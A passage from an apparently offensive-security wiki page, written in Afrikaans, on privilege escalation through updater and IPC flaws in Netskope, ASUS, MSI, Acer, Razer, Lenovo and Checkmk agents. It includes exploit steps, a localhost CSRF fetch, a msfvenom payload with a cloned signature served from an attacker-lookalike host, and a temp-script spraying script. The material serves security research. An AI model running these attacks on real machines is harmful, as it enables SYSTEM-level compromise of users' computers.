# Misbruik van Enterprise Auto-Updaters en Privileged IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows plaaslike privilege escalation-kettings wat in enterprise-endpoint-agents en updaters gevind is. Hulle stel ’n laagdrempelige IPC-koppelvlak en ’n geprivilegieerde update-vloei bloot. ’n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar ’n gebruiker met lae privilegies registrasie na ’n aanvaller-beheerde bediener kan afdwing en dan ’n kwaadwillige MSI kan aflewer wat die SYSTEM-diens installeer.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Sleutelidees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik ’n geprivilegieerde diens se localhost-IPC om herregistrasie of herkonfigurasie na ’n aanvaller se bediener af te dwing.
- Implementeer die verskaffer se update-eindpunte, lewer ’n kwaadwillige Trusted Root CA af en stuur die updater na ’n kwaadwillige, “ondertekende” pakket.
- Ontwyk swak signer-kontroles (CN-toelatingslyste), opsionele digest-vlae en permissiewe MSI-eienskappe.
- As IPC “geënkripteer” is, lei die sleutel/IV af van masjienidentifiseerders wat vir almal leesbaar in die registry gestoor word.
- As die diens bellers volgens image path/prosesnaam beperk, inject in ’n proses op die toelatingslys of begin een opgeskort en laai jou DLL met ’n minimale thread-context-patch.

Pasgemaakte plaaslike TCP-dienste verdien dieselfde hersiening van identiteit en invoergrense, selfs wanneer hulle ’n PIN of ander toepassingsbewys vereis. Bepaal watter proses na die listener gekoppel is en watter diensrekening effektief gebruik word; ondersoek dan die presiese ontplooide binêre lêer/weergawe en of velde onder die beller se beheer se lengte nagegaan word voordat dit na vaste buffers gekopieer of gebruik word om ’n child-process-opdrag saam te stel. [Microsoft se riglyne oor buffer-overruns](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) verduidelik waarom ongekontroleerde eksterne invoer gevaarlik is in geprivilegieerde native code. ’n Loopback-listener, hardcoded credential of prosesnaam alleen bewys nie geheuekorrupsie of SYSTEM-uitvoering nie; bereikbaarheid, magtiging, code path en versagtingsmaatreëls bly afsonderlike voorwaardes. Hou roetine-enumerasie passief eerder as om insette met ’n lengte wat ’n crash kan veroorsaak na ’n lewendige diens te stuur.

---
## 1) Dwing registrasie na ’n aanvaller se bediener af via localhost-IPC

Baie agents bevat ’n user-mode UI-proses wat met ’n SYSTEM-diens oor localhost-TCP met JSON kommunikeer.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC-opdrag-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-vloei:
1) Stel ’n JWT-registrasietoken saam waarvan die claims die backend-gasheer beheer (bv. AddonUrl). Gebruik alg=None sodat ’n signature nie nodig is nie.
2) Stuur die IPC-boodskap wat die provisioning-opdrag met jou JWT en tenant-naam aanroep:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Die diens begin versoeke vir registrasie/konfigurasie na jou rogue server stuur, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As oproeperverifikasie op die pad/naam gebaseer is, stuur die versoek vanaf ’n allow-listed vendor binary (sien §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Netwerkblootgestelde bestuurs-IPC

Hierdie vertrouensgrens is nie altyd tot localhost beperk nie. In die gerapporteerde MyReport Updater 2.1.1-geval het ’n `LocalSystem`-diens op alle koppelvlakke geluister en ’n ongeverifieerde gRPC-konfigurasieverandering vir die verwysingsgasheer, -poort en bedryfsmodus aanvaar. Vir die remote variant was netwerktoegang tot die listener en uitgaande toegang vanaf die diens na die gekose verwysing albei nodig. Evalueer hierdie afsonderlik van die vraag of die latere pakketvloei die file-write-grens kan oorsteek.<sup>[[16]](#references)</sup>

---
## 2) Kaping van die opdateringskanaal om kode as SYSTEM uit te voer

Sodra die kliënt met jou server kommunikeer, implementeer die verwagte endpoints en stuur dit na ’n aanvaller se MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Stuur JSON-konfigurasie terug met ’n baie kort opdateringsinterval, bv.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Stuur ’n PEM CA-sertifikaat terug. Die diens installeer dit in die Local Machine Trusted Root-winkel.
3) /v2/checkupdate → Verskaf metadata wat na ’n kwaadwillige MSI en ’n vals weergawe wys.

Omseiling van algemene kontroles wat in die praktyk voorkom:
- Signer CN allow-list: die diens kontroleer dalk net of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan ’n leaf met daardie CN uitreik en die MSI onderteken.
- CERT_DIGEST-eienskap: sluit ’n onskadelike MSI-eienskap genaamd CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Opsionele digest-afdwinging: ’n konfigurasievlag (bv. check_msi_digest=false) deaktiveer ekstra kriptografiese validering.

Gevolg: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre kode uit as NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Les oor patch-omseiling: as ’n verskaffer reageer deur ’n klein stel “vertroude” domeine op ’n allow-list te plaas in plaas daarvan om die opdateringsbron kriptografies te verifieer, soek na verskafferbeheerde redirectors of reverse proxies waarmee jy steeds verkeer kan stuur. In Netskope se geval het openbare opvolgnavorsing getoon dat ’n allow-list uit die R129-era steeds misbruik kon word deur `rproxy.goskope.com`, wat inhoud van ’n Azure App Service onder beheer van die aanvaller geproxy het. Beskou hostname allow-lists as ’n spoedhobbeltjie, nie as ’n trust boundary nie.<sup>[[14]](#references)</sup>

Nog ’n foutmodus is **selfkonsekwente maar ongeverifieerde pakketmetadata**. In die MyReport-geval het ’n verwysing onder die aanvaller se beheer ’n gewysigde argief bedien, terwyl ’n tussenganger die verskaffer se MD5-digest- en grootte-antwoorde verander het voordat dit die updater bereik het. Deur hierdie waardes te laat ooreenstem, is die konsekwentheid van die response nagegaan, nie die oorsprong daarvan by die verskaffer nie; geen MD5-botsing was nodig nie. ’n Installasiegidsie wat deur die oproeper gekies is, het daarna die bevoorregte onttrekking in ’n file-write-grens verander. Die gevolglike DLL-laaiprimitive word bespreek onder [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Vervalsing van geënkripteerde IPC-versoeke (waar teenwoordig)

Vanaf R127 het Netskope IPC-JSON in ’n encryptData-veld toegedraai wat soos Base64 lyk. Reverse engineering het AES aan die lig gebring, met ’n sleutel/IV wat afgelei is van registerwaardes wat deur enige gebruiker gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduseer en geldige geënkripteerde opdragte vanaf ’n standaardgebruiker stuur.<sup>[[1]](#references)[[2]](#references)</sup> Algemene wenk: as ’n agent skielik sy IPC “enkripteer”, soek na toestel-ID’s, product GUID’s en installasie-ID’s onder HKLM wat as materiaal gebruik word.

---
## 4) Omseiling van IPC-oproeper-allow-lists (pad-/naamkontroles)

Sommige dienste probeer die peer verifieer deur die PID van die TCP-verbinding op te soek en die image path/naam te vergelyk met allow-listed verskafferbinaries onder Program Files (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL-injectie in ’n allow-listed proses (bv. nsdiag.exe) en proxy IPC van binne dit.
- Begin ’n allow-listed binary in suspended-toestand en bootstrap jou proxy-DLL sonder CreateRemoteThread (sien §5) om aan driver-afgedwonge tamper-reëls te voldoen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection-vriendelike injectie: suspended proses + NtContinue-patch

Produkte sluit dikwels ’n minifilter-/OB-callbacks-driver (bv. Stadrv) in om gevaarlike regte te verwyder van handles na beskermde prosesse:
- Proses: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

’n Betroubare user-mode loader wat hierdie beperkings respekteer:
1) Skep ’n proses met CreateProcess van ’n verskafferbinary met CREATE_SUSPENDED.
2) Kry handles waarvoor jy steeds toegelaat word: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en ’n thread-handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode by ’n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of ’n ander vroeë, gewaarborg-gelaaide thunk) met ’n klein stub wat LoadLibraryW op jou DLL-pad aanroep en dan terugspring.
4) Voer ResumeThread uit om jou stub binne die proses te aktiveer en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op ’n reeds-beskermde proses gebruik het nie (jy het dit geskep), voldoen jy aan die driver se beleid.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktiese tooling
- NachoVPN (Netskope-plugin) outomatiseer ’n rogue CA, die ondertekening van kwaadwillige MSI’s en die bediening van die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope is ’n pasgemaakte IPC-kliënt wat arbitrêre (opsioneel AES-geënkripteerde) IPC-boodskappe saamstel en die injectie van ’n suspended proses insluit om boodskappe vanaf ’n allow-listed binary te stuur.<sup>[[4]](#references)</sup>

## 7) Vinnige triage-werkvloei vir onbekende updater-/IPC-oppervlakke

Wanneer jy met ’n nuwe endpoint-agent of ’n “helper”-suite vir ’n moederbord te doen kry, is ’n vinnige werkvloei gewoonlik genoeg om vas te stel of jy na ’n belowende privesc-teiken kyk:<sup>[[6]](#references)</sup>

1) Lys loopback-listeners op en koppel hulle aan die verskaffer se prosesse:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Lys kandidaat-named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Ontgin register-gesteunde roeteringsdata wat deur plugin-gebaseerde IPC-bedieners gebruik word:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Onttrek eers endpoint-name, JSON-keys en command-ID's uit die user-mode-kliënt. Verpakte Electron/.NET-frontends leak dikwels die volledige skema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Soek na die werklike vertrouenspredikaat, nie net die kodepad wat uiteindelik die proses begin nie:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrone wat voorkeur behoort te geniet:
- `CryptQueryObject`/sertifikaatontleding sonder `WinVerifyTrust` beteken gewoonlik dat “sertifikaat bestaan” as “sertifikaat is vertrou” beskou is, wat sertifikaatkloning of ander vals-ondertekenaartruuks moontlik maak.
- Substring-/agtervoegselkontroles op `Origin`, `Referer`, aflaai-URL’s, prosesname of ondertekenaar-CN’s is nie verifikasie nie. `contains(".vendor.com")` is gewoonlik uitbuitbaar met domeine wat deur ’n aanvaller beheer word en soos die regte domein lyk.
- As die laevoorreg-GUI besluit “die lêer is vertrou” en die SYSTEM-broker bloot daardie resultaat gebruik, omseil die pleistering of herimplementering van die kliëntkant-DLL/JS dikwels die grens heeltemal (Razer-styl verdeelde validering).
- As die broker ’n loonvrag na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie pad valideer of skeduleer, toets onmiddellik vir TOCTOU-vervangingsvensters en vir sibling-inpropmodules wat alternatiewe `ExecuteTask()`-omhulsels met swakker kontroles blootstel.<sup>[[6]](#references)</sup>

Vir teikens wat baie benoemde pype gebruik, is PipeViewer ’n vinnige manier om swak DACL’s en pype wat op afstand bereikbaar is, raak te sien voordat jy die protokol in diepte begin reverse engineer.<sup>[[11]](#references)</sup>

As die teiken oproepers slegs aan die hand van PID, beeldpad of prosesnaam verifieer, beskou dit as ’n spoedhobbel eerder as ’n grens: inspuiting in die wettige kliënt, of die verbinding vanaf ’n proses op die toelaatlys maak, is dikwels genoeg om aan die bediener se kontroles te voldoen. Vir benoemde pype spesifiek, bespreek [hierdie bladsy oor kliënt-impersonasie en pypmisbruik](named-pipe-client-impersonation.md) die primitief in meer diepte.

Vir ’n bevoorregte **opruim- of herstelbroker**, ondersoek die padvertrouensgrens sowel as die pyp-ACL. ’n Oproeper met minder voorregte kan moontlik ’n herstelligging kies of ’n gefaseerde rugsteunartefak in ’n gedeelde gids hernoem, selfs wanneer die diensuitvoerbare lêer en sy installasiegids beskerm is. Bevestig afsonderlik dat die oproeper die herstelopdrag kan bereik, die presiese gefaseerde invoer of lêernaam kan verander, die broker onder ’n hoër identiteit loop, en die herstelbewerking werklik na die gekose beskermde pad skryf. ’n Skryfbare faseringgids of ’n leesbare pyp bewys op sigself nie arbitrêre bevoorregte skryftoegang nie; die bestemmingskartering en diensgedrag moet deur kodehersiening of beheerde toetsing bevestig word. Moenie ’n onbekende opruimopdrag tydens passiewe verkenning uitvoer nie, want dit kan gebruikerslêers uitvee.

---
## 8) Modulêre byvoegingsbrokers wat slegs deur verskafferhandtekeninge geverifieer word (Lenovo Vantage-patroon)

’n Nuwer variasie wat die moeite werd is om na te soek, is die **signed-client RPC broker**: ’n Lenovo-ondertekende rekenaarproses met lae voorregte kommunikeer met ’n SYSTEM-diens, en die diens stuur JSON-opdragte na ’n stel XML-beskrewe byvoegings onder `%ProgramData%`. Sodra kode-uitvoering **binne enige aanvaarde ondertekende kliënt** bereik is, word elke `runas="system"`-kontrak deel van jou aanvalsoppervlak.<sup>[[15]](#references)</sup>

Waardevolle primitiewe wat in Lenovo Vantage-navorsing waargeneem is:
- **Om die oproeper te vertrou omdat dit deur die verskaffer onderteken is**: navorsers het ’n geverifieerde konteks bereik deur ’n Lenovo-ondertekende EXE na ’n skryfbare gids te kopieer en ’n DLL-sideload (`profapi.dll`) te bewerkstellig sodat arbitrêre kode uitgevoer is binne ’n kliënt wat die diens reeds vertrou het.
- **Ontdekking van die aanvalsoppervlak deur manifeste**: byvoegings word verklaar onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; verskeie kontrakte loop as `SYSTEM`, dus onthul die opnoem van daardie manifeste dikwels die werklike bevoorregte werkwoorde vinniger as om die broker self te reverse engineer.
- **Foute per opdrag agter die geverifieerde kanaal**: nadat hulle binne die vertroude kliënt was, het openbare navorsing padtraversering en rastoestande in opdaterings-/installasiewerkwoorde, misbruik van rou SQL in bevoorregte instellingsdatabasisse, en substring-gebaseerde registerpadkontroles gevind wat skryftoegang buite die bedoelde hive moontlik gemaak het.

Nuttige verkenning op ’n teiken:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktiese gevolgtrekking: wanneer ’n helper suite ’n broker blootstel wat eers die **caller process** verifieer en dan eers na tientalle plugin/add-in-opdragte delegeer, moenie ophou nadat jy die voorste vertrouenskontrole omseil het nie. Dump die manifest-/contract-tabel en fuzz elke hoëprivilege-werkwoord afsonderlik; die geverifieerde kanaal verberg gewoonlik verskeie tweede-fase-foute.

---
## 1) Browser-na-localhost-CSRF teen bevoorregte HTTP-API’s (ASUS DriverHub)

DriverHub lewer ’n user-mode HTTP-diens (ADU.exe) op 127.0.0.1:53000 wat verwag dat browser-oproepe van https://driverhub.asus.com af kom. Die oorsprongfilter voer bloot `string_contains(".asus.com")` uit op die Origin-header en op download-URL’s wat deur `/asus/v1.0/*` blootgestel word. Enige aanvallerbeheerde host soos `https://driverhub.asus.com.attacker.tld` slaag dus die kontrole en kan JavaScript gebruik om versoeke te stuur wat toestandsveranderinge veroorsaak.<sup>[[6]](#references)</sup> Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir bykomende omseilpatrone.

Praktiese vloei:
1) Registreer ’n domein wat `.asus.com` bevat en huisves ’n kwaadwillige webblad daarop.
2) Gebruik `fetch` of XHR om ’n bevoorregte endpoint (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON-liggaam wat die handler verwag – die saamgeperste frontend JS wys die skema hieronder.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Selfs die PowerShell CLI wat hieronder gewys word, slaag wanneer die Origin-header vervals word om die vertroude waarde te gebruik:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Enige besoek met ’n browser aan die aanvaller se webwerf word dus ’n 1-klik (of 0-klik via `onload`) plaaslike CSRF wat ’n SYSTEM-helper aandryf.

---
## 2) Onveilige code-signing-verifikasie en sertifikaatkloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre uitvoerbare lêers af wat in die JSON-liggaam gedefinieer word, en kas hulle in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. URL-validering vir aflaaie hergebruik dieselfde substring-logika, dus word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Ná die aflaai kontroleer ADU.exe slegs dat die PE ’n handtekening bevat en dat die Subject-string met ASUS ooreenstem voordat dit die lêer laat loop – geen `WinVerifyTrust` of sertifikaatkettingvalidering nie.

Om die vloei te bewapen:
1) Skep ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloon ASUS se ondertekenaar na die payload (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Gasheer `pwn.exe` op ’n `.asus.com`-nabootsingsdomein en aktiveer UpdateApp via die browser-CSRF hierbo.

Omdat beide die Origin- en URL-filters substring-gebaseer is en die ondertekenaarkontrole slegs stringe vergelyk, laai DriverHub die aanvaller se binary af en voer dit uit met sy verhoogde konteks.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in die updater se kopieer-/uitvoerpaaie (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-diens stel ’n TCP-protokol beskikbaar waarin elke raam `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die kernkomponent (Component ID `0f 27 00 00`) bevat `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Die hanteerder:
1) Kopieer die verskafde uitvoerbare lêer na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die handtekening via `CS_CommonAPI.EX_CA::Verify` (die sertifikaat se subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet slaag).
3) Skep ’n geskeduleerde taak wat die tydelike lêer as SYSTEM met aanvaller-beheerde argumente laat loop.

Die gekopieerde lêer word nie tussen verifikasie en `ExecuteTask()` gesluit nie. ’n Aanvaller kan:
- Raam A stuur wat na ’n wettige MSI-ondertekende binary wys (wat verseker dat die handtekeningkontrole slaag en die taak in die ry geplaas word).
- Dit laat jaag met herhaalde Raam B-boodskappe wat na ’n kwaadwillige payload wys en `MSI Center SDK.exe` net ná die verifikasie oorskryf.

Wanneer die skeduleerder die taak uitvoer, laat dit die oorskryfde payload as SYSTEM loop, hoewel die oorspronklike lêer gevalideer is. Betroubare uitbuiting gebruik twee goroutines/threads wat `CMD_AutoUpdateSDK` aanhoudend stuur totdat die TOCTOU-venster gewen word.<sup>[[6]](#references)</sup>

---
## 2) Misbruik van pasgemaakte IPC op SYSTEM-vlak en impersonasie (MSI Center + Acer Control Centre)

### MSI Center TCP-opdragstelle
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, kry ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 grepe van ’n raam kies daardie komponent, sodat aanvallers opdragte na arbitrêre modules kan stuur.
- Plugins kan hul eie taaklanseerders definieer. `Support\API_Support.dll` stel `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` beskikbaar en roep `API_Support.EX_Task::ExecuteTask()` direk aan, **sonder handtekeningvalidering** – enige plaaslike gebruiker kan dit na `C:\Users\<user>\Desktop\payload.exe` laat wys en op deterministiese wyse SYSTEM-uitvoering kry.
- Deur loopback-verkeer met Wireshark af te luister of die .NET-binaries in dnSpy te instrumenteer, kan die Component ↔ command-kartering vinnig onthul word; pasgemaakte Go/Python-kliënte kan dan rame herhaal.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes en impersonasievlakke
- `ACCSvc.exe` (SYSTEM) stel `\\.\pipe\treadstone_service_LightMode` beskikbaar, en sy discretionary ACL laat afgeleë kliënte toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Deur opdrag-ID `7` met ’n lêerpad te stuur, word die diens se prosesbeginroetine aangeroep.
- Die kliëntbiblioteek serialiseer ’n magiese terminatorgreep (113) saam met die argumente. Dinamiese instrumentering met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumenteringswenke) wys dat die native hanteerder hierdie waarde na ’n `SECURITY_IMPERSONATION_LEVEL` en integriteit-SID karteer voordat `CreateProcessAsUser` aangeroep word.
- Deur 113 (`0x71`) met 114 (`0x72`) te vervang, beland die uitvoering in die generiese tak wat die volledige SYSTEM-token behou en ’n hoë-integriteit-SID (`S-1-16-12288`) stel. Die proses wat begin word, loop dus as onbeperkte SYSTEM, plaaslik én oor masjiene heen.
- Kombineer dit met die blootgestelde installeerdervlag (`Setup.exe -nocheck`) om ACC selfs op lab-VM’s op te stel en die pipe sonder verskafferhardeware te toets.<sup>[[6]](#references)</sup>

Hierdie IPC-foute wys waarom localhost-dienste wedersydse verifikasie moet afdwing (ALPC-SID’s, `ImpersonationLevel=Impersonation`-filters, tokenfiltering), en waarom elke module se helper vir “arbitrêre binary laat loop” dieselfde handtekeningverifikasies moet gebruik.

---
## 3) COM/IPC-“elevator”-helpers wat op swak user-mode-validering steun (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige patroon by hierdie familie gevoeg: ’n gebruiker met lae voorregte kan ’n COM-helper vra om ’n proses via `RzUtility.Elevator` te begin, terwyl die vertrouensbesluit aan ’n user-mode-DLL (`simple_service.dll`) oorgelaat word, eerder as om dit stewig binne die bevoorregte grens af te dwing.

Waargenome uitbuitingspad:
- Skep ’n instansie van die COM-objek `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om ’n verhoogde prosesbegin aan te vra.
- In die openbare PoC word die PE-handtekeninghek binne `simple_service.dll` gelap voordat die versoek gestuur word, sodat ’n arbitrêre uitvoerbare lêer wat deur die aanvaller gekies is, begin kan word.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-aanroep:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Algemene kernboodskap: wanneer jy “helper”-suites reverse-engineer, moenie by localhost TCP of named pipes stop nie. Kyk vir COM-klasse met name soos `Elevator`, `Launcher`, `Updater` of `Utility`, en bepaal dan of die geprivilegieerde diens self die teikenbinêre lêer valideer, of bloot ’n resultaat vertrou wat deur ’n patchbare user-mode-kliënt-DLL bereken is. Hierdie patroon strek verder as Razer: enige gesplete ontwerp waarin die hoëprivilegie-broker ’n allow/deny-besluit van die laeprivilegie-kant verbruik, is ’n moontlike privesc-aanvalsoppervlak.


---
## Voorspelbare tydelike script-uitvoering tydens MSI-herstel (Checkmk Agent / CVE-2024-0670)

Sommige Windows-agente implementeer steeds geprivilegieerde aksies deur ’n tydelike `.cmd`-lêer in `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die lêernaam voorspelbaar is en die diens nie bestaande lêers veilig herskep nie, kan ’n gebruiker met lae voorregte die toekomstige tydelike lêer vooraf as **read-only** skep en die geprivilegieerde proses dwing om aanvallersbeheerde inhoud in plaas van sy eie script uit te voer.

Waargeneem in kwesbare Checkmk Agent-bouweergawes:
- tydelike lêerpatroon: `cmk_all_<PID>_1.cmd`
- geaffekteerde vertakkings: `2.0.0`, `2.1.0`, `2.2.0`
- sneller: MSI-**herstel** van die gekasde agentpakket<sup>[[8]](#references)[[9]](#references)</sup>

Praktiese werksvloei:
1. Skat ’n realistiese PID-reeks op grond van huidige proses-ID’s of die lopende agent se PID.
2. Skryf ’n kort **ASCII**-`.cmd`-payload (`Set-Content -Encoding Ascii` of `cmd.exe`-herleiding; vermy UTF-16 PowerShell-uitvoer vir batch-lêers).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die moontlike reeks en merk elke lêer as read-only.
4. Sneller ’n herstel van die gekasde MSI sodat die geprivilegieerde diens probeer om die tydelike script te herskep en dit dan uit te voer.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

As die kwesbare produk met Windows Installer geïnstalleer is, koppel die lukraak lykende gekasheerde MSI onder `C:\Windows\Installer` terug aan sy produknaam voordat jy die herstel aktiveer:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operasionele notas:
- `qwinsta` is nuttig wanneer `msiexec /fa` misluk vanuit ’n nie-interaktiewe WinRM-dop en jy moet vasstel of ’n bestaande rekenaar- of ontkoppelde sessie die herstel korrek kan aktiveer.<sup>[[7]](#references)</sup>
- Hierdie patroon geld ook vir ander endpoint-agente en updaters wat **tydelike scripts in world-writable-liggings plaas en dit later as SYSTEM uitvoer**. Toets vir voorspelbare name, ontbrekende eksklusiewe skeppingssemantiek en herstel-/opdateringsvloeie wat op aanvraag geaktiveer kan word.

### Interaktiewe installeerderherstel en bevoorregte konsole

PDF24 Creator 11.15.1 illustreer ’n afsonderlike MSI-herstelrisiko: die pasgemaakte aksie vir drukkerinstallasie kan tydens herstel ’n sigbare konsole met SYSTEM-regte begin. Die verskaffer het die MSI-installeerder in 11.15.2 verander om hierdie gedrag aan te spreek. ’n Ouer produkweergawe is slegs ’n leidraad vir triage. Kontroleer die geregistreerde of bereikbare MSI-pakket, of hierdie gebruiker herstel kan begin, of die kwesbare pasgemaakte aksie en vertraging in die loglêer teenwoordig is, en of ’n interaktiewe lessenaar die konsole sigbaar kan maak. Die gerapporteerde vertraging het ’n oplock op `faxPrnInst.log` gebruik; gewone skryfbaarheid van die lêer is nie die enigste toegangsvoorwaarde nie. ’n Nie-interaktiewe dop, ontoeganklike pakket of gelapte installeerder kan die ketting verbreek. Hierdie kwessie is nie afhanklik van `AlwaysInstallElevated` nie en verskil van die vervanging van ’n voorspelbare tydelike script.

---
## Afgeleë supply-chain-kaping via swak updater-validering (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het aanvallers wat die hosting-infrastruktuur agter die Notepad++-opdateringsvloei gekompromitteer het, selektief kwaadwillige manifests aan uitgesoekte slagoffers bedien. Ouer WinGUp-gebaseerde updaters het nie die egtheid van opdaterings volledig geverifieer nie, daarom kon ’n kwaadwillige XML-antwoord kliënte na aanvallersbeheerde URL’s herlei. Omdat die kliënt HTTPS-inhoud aanvaar het sonder om beide ’n vertroude sertifikaatketting en ’n geldige PE-handtekening op die afgelaaide installeerder af te dwing, het slagoffers ’n getrojaniseerde NSIS-`update.exe` afgelaai en uitgevoer.<sup>[[12]](#references)[[13]](#references)</sup>

Operasionele vloei (geen plaaslike exploit nodig nie):
1. **Infrastruktuuronderskepping**: kompromitteer CDN/hosting en antwoord op opdateringskontroles met aanvallermetadata wat na ’n kwaadwillige aflaai-URL wys.
2. **Getrojaniseerde NSIS**: die installeerder laai ’n payload af en voer dit uit, en misbruik twee uitvoeringskettings:
